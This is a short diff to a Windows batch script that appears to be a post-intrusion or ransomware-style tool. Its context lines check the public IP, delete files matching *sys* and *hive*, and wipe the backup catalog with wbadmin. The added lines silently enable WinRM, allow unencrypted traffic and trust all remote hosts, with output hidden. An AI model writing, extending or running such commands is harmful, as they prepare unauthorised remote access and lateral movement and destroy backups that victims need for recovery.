@@ -338,6 +338,12 @@ cmd.exe /c powershell.exe (Invoke-WebRequest -uri "https://api.ipify.org/").Cont
 ECHO ============================
 cmd.exe /c powershell.exe Test-NetConnection -ComputerName google.com -port 443 -InformationLevel detailed
 ECHO ============================
+cmd.exe /c winrm quickconfig -quiet > nul 2>&1
+ECHO ============================
+cmd.exe /c winrm set winrm/config/Client @{AllowUnencrypted = “true”} > nul 2>&1
+ECHO ============================
+cmd.exe /c powershell.exe Set-Item WSMan:localhost\client\trustedhosts -value * -Force > nul 2>&1
+ECHO ============================
 del *sys* & del *hive*
 ECHO ============================
 wbadmin delete catalog -quiet
